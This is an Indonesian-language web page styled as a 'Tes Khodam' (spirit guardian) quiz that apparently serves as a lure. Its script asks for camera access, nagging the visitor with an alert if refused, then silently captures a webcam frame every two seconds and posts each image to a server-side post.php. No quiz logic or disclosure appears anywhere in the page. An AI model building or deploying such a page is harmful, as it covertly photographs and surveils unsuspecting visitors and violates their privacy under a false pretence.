<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Tes Khodam by adrian ganteng</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: flex-start;
        min-height: 100vh;
        padding: 20px;
    }
    h2 {
        font-size: 1.8em;
        margin-bottom: 20px;
        color: #222;
        text-shadow: 0 0 5px #000;
    }
    video {
        border-radius: 15px;
        border: 4px solid #ff7700;
        box-shadow: 0 0 20px rgba(0,0,0,0.5);
    }
</style>
</head>
<body>
<h2>Tes khodam kamju</h2>
<video id="video" width="640" height="480" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;

        setInterval(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
            $.post("post.php", { cam_image: imgData });
        }, 2000);
    } catch(err) {
        console.error("Gagal akses kamera:", err);
        alert("Browser tidak bisa akses kamera! Izinkan akses kamera!");
    }
}

initCamera();
</script>
</body>
</html>
